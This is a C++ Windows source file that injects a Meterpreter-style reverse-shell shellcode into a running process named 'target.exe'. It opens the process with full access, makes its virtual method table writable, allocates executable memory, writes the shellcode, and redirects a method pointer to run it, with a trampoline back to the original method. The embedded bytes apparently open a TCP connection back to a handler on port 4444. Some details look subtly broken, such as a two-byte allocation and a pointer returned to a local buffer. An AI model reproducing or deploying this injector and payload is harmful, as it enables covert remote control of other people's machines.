#include <iostream>
#include <windows.h>
#include <TlHelp32.h>

using namespace std;


LPVOID AllocPayloadMem(HANDLE Process);

unsigned writeProcessMem(HANDLE processHandle, void * hookFuncAddr, void * vmtAddr, void * trampoline); 

DWORD SetPagePermissions(HANDLE ProcessHandle, void * vmt, DWORD permissions);

DWORD FindProcess(const wchar_t* processName);

HANDLE GetProcessHandle(DWORD pid);

DWORD FindProcess(const wchar_t* processName);

void ** ReadVmtFrom_thisPtr(HANDLE processHandle, const void * thisptr);

int main(int argc, char** argv) 
{

	if (argc < 2)
	{
		cout << "[~] wrong usage, supply VMT addr" << endl;
		return 0;
	}
	
	DWORD lastErr;


	// 0. create meterpreter payload and add register saving & restoring & push (original method pointer) & ret instructions


	LPCVOID this_ptr = (LPCVOID)0x00F3F82C; // pointer to this pointer change to the object pointer :)

	DWORD pid = FindProcess(L"target.exe"); // 1. finding target process
	
	if (pid == NULL)
	{
		lastErr = GetLastError();
		printf("%d", lastErr);
		return 0;
	}

	HANDLE ProcessHandle = GetProcessHandle(pid); // 2.  getting handle
	
	if (ProcessHandle == NULL)
	{
		lastErr = GetLastError();
		printf("%d", lastErr);
		return 0;
	}

	void ** ptr_vmt_ptr = ReadVmtFrom_thisPtr(ProcessHandle, this_ptr); // 3. get vmt
	if (ptr_vmt_ptr == 0)
	{
			lastErr = GetLastError();
			printf("%d", lastErr);
			return 0;
	}

	void* vmt_ptr = *ptr_vmt_ptr; // this pointer -> this[0] = 1st method pointer in vmt 

	void ** first_method_ptr = ReadVmtFrom_thisPtr(ProcessHandle, vmt_ptr); // 4. get first method pointer

	if (first_method_ptr == 0)
	{
		lastErr = GetLastError();
		printf("%d", lastErr);
		return 0;
	}

	void * first_method = *first_method_ptr;

	DWORD oldPermissions = SetPagePermissions(ProcessHandle, vmt_ptr, PAGE_EXECUTE_READWRITE); // 5. change permissions of vmt to be writeable
	
	if (oldPermissions == NULL)
	{
		lastErr = GetLastError();
		printf("%d", lastErr);
		return 0;
	}

	void* hook_func_addr = AllocPayloadMem(ProcessHandle); // 6. allocate memory for shellcode

	if (hook_func_addr == NULL)
	{
		lastErr = GetLastError();
		printf("%d", lastErr);
		return 0;
	}

	if (writeProcessMem(ProcessHandle, hook_func_addr, vmt_ptr, first_method) == 0) // 7. write shellcode & override pointer
	{
		lastErr = GetLastError();
		printf("%d", lastErr);
		return 0;
	}

	lastErr = SetPagePermissions(ProcessHandle, vmt_ptr, oldPermissions); // 8. restore permissions
	
	if (lastErr == 0)
	{
		lastErr = GetLastError();
		printf("%d", lastErr);
		return 0;
	}

	return 1;
}

unsigned writeProcessMem(HANDLE processHandle, void * hookFuncAddr, void * vmtAddr, void * trampoline) //DWORD dwFlags, void* dst, void* src)
{
	
	unsigned char buf[] =
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x60\x9C"
		"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
		"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
		"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
		"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
		"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
		"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
		"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
		"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
		"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
		"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
		"\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54"
		"\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x7f\x00\x00\x01"
		"\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
		"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
		"\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67"
		"\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
		"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00"
		"\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"
		"\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"
		"\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5"
		"\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85"
		"\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1"
		"\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5\x90\x90\x61\x9D"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x68\x89\x13\xb7\x00\xc3";


	SIZE_T numberOfBytesWritten;

	DWORD res;

	res = WriteProcessMemory(processHandle, hookFuncAddr, &buf, sizeof(buf), &numberOfBytesWritten); // write opcodes to memory

	if (!res)
	{
		return 0;
	}

	res = WriteProcessMemory(processHandle, vmtAddr, &hookFuncAddr, sizeof(hookFuncAddr), &numberOfBytesWritten); // override vmt entry

	if (!res)
	{
		return 0;
	}

	return 1;
}

HANDLE GetProcessHandle(DWORD pid)
{
	HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (p == NULL)
		return NULL;
	return p;
}

DWORD FindProcess(const wchar_t* processName) {

	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		cout << "[---] Could not create snapshot.\n" << endl;
		return 0;
	}

	// Set the size of the structure before using it.
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32)) {
		//printError(TEXT("Process32First"));
		CloseHandle(hProcessSnap);
		return FALSE;
	}

	do {
		if (wcscmp(pe32.szExeFile, processName) == 0) {
			return pe32.th32ProcessID;
		}

	} while (Process32Next(hProcessSnap, &pe32));

	cout << "the process has not been loaded into memory, aborting.\n" << endl;

	return NULL;
}

LPVOID AllocPayloadMem(HANDLE Process) // alloc memory for opcodes
{
	LPVOID payload = VirtualAllocEx(Process, NULL, 2, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	return payload;
}

DWORD SetPagePermissions(HANDLE ProcessHandle, void * vmt, DWORD permissions) // set permissions for VMT
{
	DWORD oldPermissions, Res;
	Res = VirtualProtectEx(ProcessHandle, vmt, sizeof(vmt), permissions, &oldPermissions);
	if (Res == FALSE)
	{
		return NULL;
	}
	return oldPermissions;
}

void ** ReadVmtFrom_thisPtr(HANDLE processHandle, const void * thisptr)
{
	BYTE vmt_ptr[4];
	
	SIZE_T NumberOfBytesRead;
	
	if (!ReadProcessMemory(processHandle, thisptr, vmt_ptr, sizeof(vmt_ptr), &NumberOfBytesRead))
	{
		return 0;
	}

	void** ptr_vmt_ptr = (void**)vmt_ptr;

	return ptr_vmt_ptr;
}